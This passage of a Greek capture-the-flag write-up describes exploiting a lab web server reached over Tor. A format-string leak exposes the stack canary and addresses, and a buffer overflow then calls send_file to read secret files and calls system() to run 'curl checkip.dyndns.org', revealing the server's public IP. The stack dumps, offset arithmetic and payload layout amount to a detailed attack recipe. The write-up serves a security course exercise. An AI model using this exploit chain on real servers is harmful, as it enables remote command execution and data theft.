- 1 random word, στο script μας προσθέτουμε την διεύθυνση του buffer ωστόσο στην πράξη μπορεί απλά να περιέχει 8 χαρακτήρες ‘F’.
- Την διεύθυνση του buffer.

## Υλοποίηση του attack

Για να εφαρμόσουμε όλα τα παραπάνω και να πραγματοποιήσουμε την επίθεση μας, υλοποιήσαμε το script [q5_buffer_overflow_send_file.py](q5/q5_buffer_overflow_send_file.py).

Συνοπτικά, η λειτουργία του script είναι:
- Αρχικά, κατασκευάζουμε το curl request το οποίο θα πραγματοποιήσει το Print Format Attack. Όπως εξηγήθηκε αναλυτικά παραπάνω, το attack επιτυγχάνεται μέσω του Authorization header. Λόγω του tor, κάποια requests αργούν να απαντηθούν από τον server (ή κάποιες φορές λαμβάνουν κενή απάντηση). Έτσι, προσθέσαμε την παράμετρο ```--max-time 10``` καθώς και ένα while loop. Έτσι, εάν το request δεν έχει την επιθυμητή απάντηση (είτε λόγω καθυστέρησης, είτε λόγω κενής απάντησης από τον server) τότε αυτό επαναλαμβάνεται.
- Έχοντας λάβει την επιθυμητή απάντηση από τον server, κάνουμε parse το output και εντοπίζουμε τις τιμές που μας ενδιαφέρουν. Δηλαδή το canary, την τιμή του ebp και την τιμή του return address.
- Στην συνέχεια κατασκευάζουμε το payload του attack μας. Η διαδικασία αυτή εξηγείται στην παράγραφο “**Δημιουργία του payload**”.
- Έχοντας κατασκευάσει το payload (σαν δεκαεξαδικό string), το μετατρέπουμε σε binary data και αποθηκεύουμε αυτά τα δεδομένα σε ένα αρχείο με όνομα **binary_data**
- Τέλος, κατασκευάζουμε και εκτελούμε το τελικό curl request το οποίο θα πραγματοποιήσει το attack μας. Για το request αυτό, ισχύουν:
   - Το data payload του request δίνεται σε binary μορφή μέσω του αρχείου (binary_data) που δημιουργούμε. Αυτό επιτυγχάνεται μέσω της παραμέτρου: ```--data-binary '@binary_data'```.
   - Παρατηρήσαμε πως ορισμένες φορές το attack μέσω του curl request αποτυγχάνει. Ωστόσο, εκτελώντας ξανά ακριβώς το ίδιο request το attack ήταν επιτυχημένο. Αυτό οφείλεται είτε σε μεγάλη καθυστέρηση του server, είτε σε κάποιο internal error στον server. Έτσι έχουμε προσθέσει ένα while loop το οποίο επαναλαμβάνει το ίδιο request όταν συναντήσει κάποιο από τα γνωστά errors που παρατηρήσαμε από τις εκτελέσεις μας.

### Curl Requests στο Tor
Όσον αφορά τα curl requests μέσω tor, χρησιμοποιούμε το πρωτόκολλο SOCKS5 το οποίο χρησιμοποιεί το Tor. Πιο συγκεκριμένα, αρχικά χρειάζεται η εγκατάσταση του tor:
```
sudo apt-get install tor
```
Στην συνέχεια, η εκκίνηση του:
```
sudo service tor start
```
Για να ελέγξουμε αν δουλεύει, μπορούμε να εκτελέσουμε το εξής curl request:
```
curl --socks5 localhost:9050 --socks5-hostname localhost:9050 -s https://check.torproject.org/ | cat | grep -m 1 Congratulations | xargs
```
Επίσης, μπορούμε να ελέγξουμε τα ανοιχτά ports στο μηχάνημα μας. Αυτό γίνεται μέσω της εντολής: ```sudo ss -tulpn```. Μεταξύ άλλων, θα πρέπει να δούμε το εξής:
```
…
tcp  LISTEN 0      4096          127.0.0.1:9050         0.0.0.0:*     users:(("tor",pid=611,fd=8))
…
```
Όπως είναι αντιληπτό από τα παραπάνω, το default port του Tor (σε μηχανήματα Linux) είναι το **9050**.

Εφόσον έχουμε εκτελέσει τα παραπάνω βήματα, για να πραγματοποιήσουμε ένα curl request στο Tor αρκεί να προστεθεί η παράμετρος: ```--socks5-hostname localhost:9050```. Για παράδειγμα:
```
curl --socks5-hostname localhost:9050 -v <tor_address> <extra_headers>
```

Επιπλέον πηγές για την εκτέλεση curl requests στο tor μέσω του SOCKS5:
- https://sylvaindurand.org/use-tor-with-python/
- https://www.devdungeon.com/content/making-tor-requests-command-line-curl

Τελικά, εκτελώντας το script [q5_buffer_overflow_send_file.py](q5/q5_buffer_overflow_send_file.py) πετυχαίνουμε το attack μας.

## Αποτελέσματα

Εκτελώντας το script [q5_buffer_overflow_send_file.py](q5/q5_buffer_overflow_send_file.py) καταφέρνουμε να αποκτήσουμε τα περιεχόμενα του αρχείου “/secet/x”.

Τα περιεχόμενα του οποίου είναι:
```
Welcome to the YS13 oasis! ❤️

Over the past 5 years we've been evolving YS13 to fit a greater range of research activities
while also being in contact with fellow enterpreneurs who help us monetize and bring our goals
reality.

We have a long list of projects to get where we want, but our next priority is "Plan X":
that is, building an indoors greenhouse so that we can finally cultivate onions and avocados when we
send our initial colony on Saturn.

We are missing a "solar wind analyzer" to be able to proceed with this plan.
If you see this page and you have one, please bring it to the YS13 store and we will count you in as a project backer.

Love you big time!

PS. As always a big part of the YS13 mission is research. Reaching Saturn is not easy.
Lately we've been finishing the experiments for "Plan Y" which is finding the actual value of the ultimate coefficient.
Our supercomputer is working on it but it's taking forever.
(check /secret/y for some preliminary results, we need better accuracy to avoid destabilizing the space-plant continuum).
```

Διαβάζοντας το παραπάνω κείμενο, μεταξύ άλλων, μας κατευθύνει στο αρχείο “**/secret/y**”.

Έτσι, χρησιμοποιώντας το ίδιο script και αλλάζοντας το string που περνιέται σαν παράμετρος στην send_file από: “**/secret/x**” σε: “**/secret/y**”, λαμβάνουμε το περιεχόμενο του αρχείου **/secret/y**. Το οποίο είναι:
```
Computing, approximate answer: FLAG={41.99299141232}
...



Plan Z: troll humans who ask stupid questions (real fun).
I told them I need 7.5 million years to compute this XD

In the meanwhile I'm travelling through time trolling humans of the past.
Currently playing this clever dude using primitive hardware, he's good but the
next move is crushing...

1.e4 c6 2.d4 d5 3.Nc3 dxe4 4.Nxe4 Nd7 5.Ng5 Ngf6 6.Bd3 e6 7.N1f3 h6 8.Nxe6 Qe7 9.0-0 fxe6 10.Bg6+ Kd8 11.Bf4 b5 12.a4 Bb7 13.Re1 Nd5 14.Bg3 Kc8 15.axb5 cxb5 16.Qd3 Bc6 17.Bf5 exf5 18.Rxe7 Bxe7

PS. To reach me in the past use the code: FLAG={<next move><public IP of this machine>}
```
*Παρατήρηση: Τα strings “**/secret/x**” και "**/secret/y**" έχουν ακριβώς το ίδιο μήκος. Επομένως δεν χρειάζεται να αλλάξουμε κάτι άλλο στο script όσον αφορά το padding του payload. Αν είχαν διαφορετικό μήκος, τότε θα χρειαζόταν η απαραίτητη προσαρμογή στο padding.*

Έτσι έχουμε καταφέρει να βρούμε την απάντηση στο ερώτημα μας (και το αντίστοιχο Flag). Ταυτόχρονα έχουμε λάβει και κάποια στοιχεία για την επίλυση του επόμενου ερωτήματος.

Δηλαδή, το flag του ερωτήματος 5 είναι: ```FLAG={41.99299141232}```.

Επομένως, η απάντηση στο ερώτημα ```Ποια είναι τα results του "Plan Y"``` είναι ```41.99299141232```
 

# Ερώτηση 6: Ποιο είναι το code του "Plan Z";

Από το περιεχόμενο του αρχείου **/secet/y** που βρήκαμε στο ερώτημα 5, μας δόθηκαν οι εξής πληροφορίες:
```
Plan Z: troll humans who ask stupid questions (real fun).
I told them I need 7.5 million years to compute this XD

In the meanwhile I'm travelling through time trolling humans of the past.
Currently playing this clever dude using primitive hardware, he's good but the
next move is crushing...

1.e4 c6 2.d4 d5 3.Nc3 dxe4 4.Nxe4 Nd7 5.Ng5 Ngf6 6.Bd3 e6 7.N1f3 h6 8.Nxe6 Qe7 9.0-0 fxe6 10.Bg6+ Kd8 11.Bf4 b5 12.a4 Bb7 13.Re1 Nd5 14.Bg3 Kc8 15.axb5 cxb5 16.Qd3 Bc6 17.Bf5 exf5 18.Rxe7 Bxe7

PS. To reach me in the past use the code: FLAG={<next move><public IP of this machine>}
```

Έτσι, για την επίλυση του έκτου ερωτήματος έπρεπε:
- Να βρούμε την επόμενη κίνηση (next move).
- Να βρούμε την public IP του μηχανήματος που τρέχει ο server.

## Εύρεση Επόμενης Κίνησης

Όπως είναι λογικό, το πρώτο πράγμα που μας τράβηξε το ενδιαφέρον είναι το:
```
1.e4 c6 2.d4 d5 3.Nc3 dxe4 4.Nxe4 Nd7 5.Ng5 Ngf6 6.Bd3 e6 7.N1f3 h6 8.Nxe6 Qe7 9.0-0 fxe6 10.Bg6+ Kd8 11.Bf4 b5 12.a4 Bb7 13.Re1 Nd5 14.Bg3 Kc8 15.axb5 cxb5 16.Qd3 Bc6 17.Bf5 exf5 18.Rxe7 Bxe7
```
που περιέχεται στο παραπάνω μήνυμα.

Κάνοντας copy-paste το παραπάνω στο google, αμέσως καταλαβαίνουμε ότι πρόκειται για κινήσεις παιχνιδιού σκάκι.

Η δεύτερη σελίδα που εμφανίζεται στην αναζήτηση είναι η: [Man vs Machine - Kasparov](https://www.kasparov.com/timeline-event/deep-blue/). Σε αυτήν, παρουσιάζονται τα 6 διάσημα παιχνίδια του Garry Kasparov εναντίον του υπέρ-υπολογιστή της IBM Deep Blue.

Προχωρώντας προς τα κάτω, παρουσιάζεται το rematch που πραγματοποιήθηκε το 1997. Φτάνοντας στο τέλος της σελίδας, βλέπουμε το έκτο (και τελευταίο) παιχνίδι μεταξύ τους. Παρατηρούμε ότι οι κινήσεις είναι ίδιες με αυτές που υπάρχουν στο αρχείο **/secet/y**. Πιο συγκεκριμένα:
```
Game 6
Main article: Deep Blue versus Kasparov, 1997, Game 6
Before the sixth match the overall score was even: 2½–2½. As in game 4, Kasparov played the Caro-Kann Defence. He then allowed Deep Blue to commit a knightsacrifice which wrecked his defences and forced him to resign in fewer than twenty moves.

This game was played on May 11, 1997.

Deep Blue–Kasparov
1.e4 c6 2.d4 d5 3.Nc3 dxe4 4.Nxe4 Nd7 5.Ng5 Ngf6 6.Bd3 e6 7.N1f3 h6 8.Nxe6 Qe7 9.0-0 fxe6 10.Bg6+ Kd8 11.Bf4 b5 12.a4 Bb7 13.Re1 Nd5 14.Bg3 Kc8 15.axb5 cxb5 16.Qd3 Bc6 17.Bf5 exf5 18.Rxe7 Bxe7 19.c4 1–0
```
Το αρχείο **/secet/y** περιέχει τις 18 πρώτες κινήσεις. Αντίθετα, παραπάνω βλέπουμε και την 19η (και τελευταία) κίνηση του παιχνιδιού.

Επομένως, συμπεραίνουμε πως η επόμενη κίνηση είναι η ```c4```


## Εύρεση της Public IP

Ερχόμενοι από το ερώτημα 5, έχουμε σαν δεδομένο ότι είναι εφικτό να πραγματοποιηθεί ένα buffer overflow και μέσω αυτού να καλέσουμε μια συνάρτηση της αρεσκείας μας.

Έχοντας μελετήσει όλο τον κώδικα του pico server από τα προηγούμενα ερωτήματα, είχαμε παρατηρήσει της εξής εντολή στο αρχείο main.c:
```c
system("cd check-secret && ./check-secret < /tmp/cipher");
```
μέσω της οποίας εκτελείται το executable **check-secret** και γενικά χρησιμοποιείται για την εκτέλεση shell commands.

Έτσι μας ήρθε η ιδέα να την καλέσουμε μέσω buffer overflow (δίνοντας φυσικά το κατάλληλο όρισμα) και έτσι να μάθουμε την public IP του μηχανήματος στο οποίο τρέχει ο pico server. Το οποίο και υλοποιήσαμε.

Για την υλοποίηση αυτού του attack βασιστήκαμε στο script του προηγούμενο ερωτήματος. Για το νέο attack χρειάστηκαν οι εξής δύο αλλαγές:
- Έπρεπε να βρούμε την διεύθυνση της συνάρτησης system έτσι ώστε να κάνουμε overwrite το return address της post_param. Δηλαδή αντί να αποθηκεύουμε την διεύθυνση της συνάρτησης send_file (ερώτημα 5) έπρεπε πλέον να αποθηκεύουμε το address της system.
- Αλλάξαμε τον τρόπο με τον οποίο περνάμε το όρισμα στην συνάρτηση που θα κληθεί μέσω του buffer overflow. Παραπάνω λεπτομέρειες εξηγούνται στην συνέχεια.

Εκτός από αυτές τις δύο αλλαγές όλα τα υπόλοιπα είναι ακριβώς ίδια με το ερώτημα 5 και επομένως δεν θα αναλυθούν ξανά.

### System Address

Για την εύρεση της διεύθυνσης της συνάρτησης system ακολουθούμε την ίδια διαδικασία με αυτήν που ακολουθήσαμε για την εύρεση της διεύθυνσης της send_file στο ερώτημα 5.

Αρχικά, έχουμε ήδη έτοιμο από το ερώτημα 5 το Print format Attack, μέσω του οποίοι παίρνουμε όλες τις χρήσιμες τιμές της στοίβας. Το attack είναι ακριβώς το ίδιο, δηλαδή το output που παίρνουμε είναι:
```
WWW-Authenticate: Basic realm="Invalid user: 5656c310 0000009a 56556511 f7d05d80 00000000 5655c47a 56559180 f7d05d80 00000000 5656c310 0000009a 00000000 00000001 5656c310 00000000 56557569 0000009a ffffcf58 f7b9dff2 f7d05d80 00000000 00000000 f7b5f570 f7b9dfd7 f7d03880 f7d05d80 24913800 f7d05d80 56558f04 ffffcf68 565560c2"
``` 
Στο οποίο περιέχονται οι εξής διευθύνσεις:
```
5656c310 0000009a 56556511 f7d05d80 00000000 5655c47a 
56559180 f7d05d80 00000000 5656c310 0000009a 00000000 
00000001 5656c310 00000000 56557569 0000009a ffffcf58 
f7b9dff2 f7d05d80 00000000 00000000 f7b5f570 f7b9dfd7 
f7d03880 f7d05d80 24913800 f7d05d80 56558f04 ffffcf68 565560c2
```
Όπου:
- Η 31η τιμή είναι το return address της συνάρτησης check_auth ```565560c2```.
- Η 30ή τιμή είναι η τιμή του $ebp ```ffffcf68``` (η οποία είναι ίδια με την τιμή του $ebp εσωτερικά της post_param).
- Η 27η τιμή είναι η τιμή του canary ```24913800```

Επίσης έχουμε ήδη υπολογίσει την διεύθυνση του buffer (post_data) η οποία έχει offset -136 από την τιμή του $ebp (30ή τιμή από το attack). Δηλαδή, αφαιρώντας 136 (στο δεκαδικό) από την τιμή του $ebp, παίρνουμε την διεύθυνση του buffer.

Για να βρούμε την διεύθυνση της συνάρτησης **system**, αρχικά εκτελούμε τον server μέσω του gdb και εκτελούμε:
```
(gdb) info address system
Symbol "system" is at 0xf7b6a3d0 in a file compiled without debugging.
```
Συγκρίνοντας την διεύθυνση της **system** με όλες τις διευθύνσεις που πήραμε από το Print Format Attack, παρατηρούμε ότι είναι σχετικά κοντά με την 28η τιμή (δηλαδή την τιμή αμέσως μετά το canary). Από εδώ και στο εξής ονομάζουμε την τιμή αυτή **system_reference_point**.

Έτσι σκεφτήκαμε να υπολογίσουμε το offset μεταξύ των δύο αυτών τιμών και να υπολογίζουμε κάθε φορά την διεύθυνση της system μέσω του system_reference_point (δηλαδή αντίστοιχα με αυτό που κάναμε για τον υπολογισμό του address της send_file). Έτσι, έχουμε:
```
system_address = 0xf7b6a3d0
system_reference_point =  0xf7d05d80
Hexadecimal: system_address - system_reference_point = 0xf7b6a3d0 - 0xf7d05d80 = -19B9B0
Decimal: system_address - system_reference_point = 4155941840 – 4157627776 = -1685936
```
Δηλαδή η συνάρτηση system έχει offset -1685936 από το system_reference_point. Με άλλα λόγια, αφαιρώντας 1685936 (στο δεκαδικό) από το system_reference_point, παίρνουμε την διεύθυνση της system.

Έτσι έχουμε καταφέρει να βρούμε την διεύθυνση της system υπολογίζοντας σχετικές αποστάσεις από τα περιεχόμενα της στοίβας, δηλαδή θεωρητικά μπορούμε να βρούμε την διεύθυνση της και στο μηχάνημα όπου τρέχει o server του onion site.

Επίσης, έχουμε όλες τις υπόλοιπες τιμές/διευθύνσεις που χρειαζόμαστε για το attack καθώς υπολογίζονται ακριβώς με τον ίδιο τρόπο που υπολογίστηκαν στο ερώτημα 5. Έτσι παραλείπεται η εξήγηση τους.

*Παρατήρηση: λόγω του ότι η system πρόκειται για ένα library function έπρεπε να σιγουρευτούμε ότι η διεύθυνση που υπολογίζουμε είναι σωστή, πριν προσπαθήσουμε να επιτεθούμε στο onion site. Έτσι, αρχικά δοκιμάσαμε τοπικά χωρίς την χρήση του gdb (κατά την εκτέλεση του server). Στην συνέχεια δοκιμάσαμε σε ένα μηχάνημα linux της σχολής (πάλι εκτελώντας τον server χωρίς gdb). Και στις δύο περιπτώσεις η διεύθυνση της system υπολογιζόταν σωστά, δηλαδή τόσο το system_reference_point όσο και το offset είχαν επιλεγεί σωστά.* 

## Argument της system

Στόχος μας είναι να καλέσουμε την συνάρτηση system δίνοντας της το όρισμα:
```
curl checkip.dyndns.org
```
μέσω του οποίου εκτυπώνεται η public IP του μηχανήματος που εκτελεί το curl request.

Στο ερώτημα 5, η προσθήκη ορίσματος στην συνάρτηση που καλούμε μέσω buffer overflow έγινε:
- Αποθηκεύοντας το επιθυμητό string στην αρχή του buffer post_data (δηλαδή στην αρχή του attack payload)
- Αποθηκεύοντας την διεύθυνση του buffer (δηλαδή την διεύθυνση όπου ξεκινάει το string) στο δεύτερο word μετά το return address. Δηλαδή, στο σημείο από το οποίο η συνάρτηση παίρνει το πρώτο της όρισμα (στην περίπτωση μας τύπου char *, δηλαδή address).

Ωστόσο, δοκιμάζοντας την ίδια “τακτική”, παραδόξως, δεν είχε αποτέλεσμα και δεν καταφέραμε να εντοπίσουμε τον λόγο.

Έτσι, δοκιμάσαμε μια διαφορετική προσέγγιση. Πιο συγκεκριμένα:
- Αποθηκεύουμε το επιθυμητό string στο τρίτο word μετά το return address.
- Στο δεύτερο word μετά το return address αποθηκεύουμε την διεύθυνση του 3ου word μετά το return address (δηλαδή την αμέσως επόμενη διεύθυνση), στην οποία αποθηκεύσαμε το string μας.

Επομένως, το attack payload μας έχει την μορφή:
```
13 random words + buffer_addr + 1 random word + canary + 2 random words + ebp_content + address of system + 1 random word + address of next word + “curl checkip.dyndns.org”
```

Άρα, το μόνο που απομένει για να μπορέσουμε να δημιουργήσουμε το payload είναι να βρούμε την διεύθυνση στην οποία αποθηκεύσαμε το string μας.

Αρχικά, γνωρίζουμε ήδη (από το ερώτημα 5) την διεύθυνση του buffer, η οποία προκύπτει από την τιμή του $ebp συν το κατάλληλο offset που βρήκαμε.
```
buffer_addr = ebp_content - 136
```
Επίσης γνωρίζουμε ότι το return address απέχει από την διεύθυνση του buffer 19 words. To string μας βρίσκεται στο 3ο word μετά το return address. Άρα συνολικά 22 words. Επομένως:
```
string_address = buffer_addr + (22*4) = ebp_content - 136 + 88
```

Έτσι, έχουμε όλες τις απαραίτητες πληροφορίες για την “κατασκευή” του attack payload.

Δοκιμάζοντας την παραπάνω προσέγγιση καταφέραμε επιτυχώς να περάσουμε το όρισμα μας στην συνάρτηση system.

## Δημιουργία του payload

Η διαδικασία για την δημιουργία του payload είναι ακριβώς η ίδια με αυτήν που περιγράφηκε αναλυτικά στο ερώτημα 5. Έτσι, δεν περιγράφεται ξανά.

Η μόνη διαφορά είναι το σημείο στο οποίο αποθηκεύεται το string που θέλουμε να περάσουμε σαν παράμετρο στην συνάρτηση. Αντί να είναι στην αρχή του payload, πλέον βρίσκεται στο τέλος. Πλέον, στην αρχή του payload υπάρχει μόνο padding (δηλαδή χαρακτήρες ’F’) . Επίσης στο τέλος του payload (το οποίο ταυτίζεται με το τέλος του string) προσθέτουμε το δεκαεξαδικό ‘3D’ (που αντιστοιχεί στο χαρακτήρα ‘=’) το οποίο εσωτερικά του κώδικα του pico θα μετατραπεί σε ‘\0’, έτσι ώστε να τερματίσουμε το string.

## Υλοποίηση του attack

Για να εφαρμόσουμε όλα τα παραπάνω και να πραγματοποιήσουμε την επίθεση μας, υλοποιήσαμε το script [q6_buffer_overflow_system.py](q6/q6_buffer_overflow_system.py).

Η λειτουργία του script είναι ακριβώς η ίδια με αυτή του script του ερωτήματος 5. Η μόνες διαφορές είναι αυτές που περιγράφηκαν αναλυτικά παραπάνω. Όλες οι άλλες λεπτομέρειες της υλοποίησης εξηγούνται στην αντίστοιχη παράγραφο του ερωτήματος 5.

Εκτελώντας το script [q6_buffer_overflow_system.py](q6/q6_buffer_overflow_system.py) πετυχαίνουμε το attack μας.

## Αποτελέσματα
 
Εκτελώντας το script [q6_buffer_overflow_system.py](q6/q6_buffer_overflow_system.py) καταφέρνουμε να μάθουμε την public IP του μηχανήματος στο οποίο τρέχει ο server. Συγκεκριμένα, το output που λαμβάνουμε είναι το εξής:
```html
<html><head><title>Current IP Check</title></head><body>Current IP Address: 54.210.15.244</body></html>
```

Έχοντας βρει το next move και την public IP:
```
Next Move: c4
Public IP: 54.210.15.244
```
 Κατασκευάζουμε το flag, το οποίο είναι:
```
FLAG={c454.210.15.244}
```

